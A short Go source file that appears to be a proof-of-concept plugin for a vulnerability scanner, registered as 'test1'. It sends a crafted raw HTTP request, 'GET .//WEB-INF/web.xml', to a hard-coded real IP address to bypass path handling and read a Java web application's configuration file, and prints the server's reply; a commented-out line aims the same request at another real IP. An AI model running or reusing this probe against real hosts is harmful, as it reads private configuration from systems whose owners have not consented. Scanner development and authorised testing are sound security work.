package _go

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"time"

	"github.com/valyala/fasthttp"
)

var client *fasthttp.Client

func Init() {
	// You may read the timeouts from some config
	readTimeout, _ := time.ParseDuration("500ms")
	writeTimeout, _ := time.ParseDuration("500ms")
	maxIdleConnDuration, _ := time.ParseDuration("1h")
	client = &fasthttp.Client{
		ReadTimeout:                   readTimeout,
		WriteTimeout:                  writeTimeout,
		MaxIdleConnDuration:           maxIdleConnDuration,
		NoDefaultUserAgentHeader:      true, // Don't send: User-Agent: fasthttp
		DisableHeaderNamesNormalizing: true, // If you set the case on your headers correctly you can enable this
		DisablePathNormalizing:        true,
		// increase DNS cache time to an hour instead of default minute
		Dial: (&fasthttp.TCPDialer{
			Concurrency:      4096,
			DNSCacheDuration: time.Hour,
		}).Dial,
	}
}

func afrogGoPocTest1(ssa *ScriptScanArgs) (Result2, error) {
	//statusCode, body, err := fasthttp.Get(nil, "http://118.213.241.186/.//WEB-INF/web.xml")
	conn, err := net.DialTimeout("tcp", "61.178.109.49:80", time.Duration(10)*time.Second)
	if err != nil {
		fmt.Printf("connect err => %s\n", err.Error())
	}
	buf := bytes.Buffer{}
	buf.WriteString("GET .//WEB-INF/web.xml HTTP/1.1\r\n")
	buf.WriteString("Host: 61.178.109.49:80\r\n")
	buf.WriteString("USer-Agent: Mozilla/4.0 (compatible, MSIE 7.0, Windows NT 5.1, 360SE)\r\n")
	// 请求头结束
	buf.WriteString("\r\n")
	// 请求body结束
	buf.WriteString("\r\n\r\n")
	fmt.Fprintf(conn, buf.String())
	if err != nil {
		fmt.Println(err.Error())
	}
	// 获取响应信息
	for i := 0; i < 100; i++ {
		e, _ := bufio.NewReader(conn).ReadByte()
		fmt.Printf(string(e))
	}
	message, err := ioutil.ReadAll(bufio.NewReader(conn))
	fmt.Println("Message from server: ", err, string(message))

	return Result2{}, nil
}

func init() {
	Init()
	ScriptRegister("test1", afrogGoPocTest1)
}
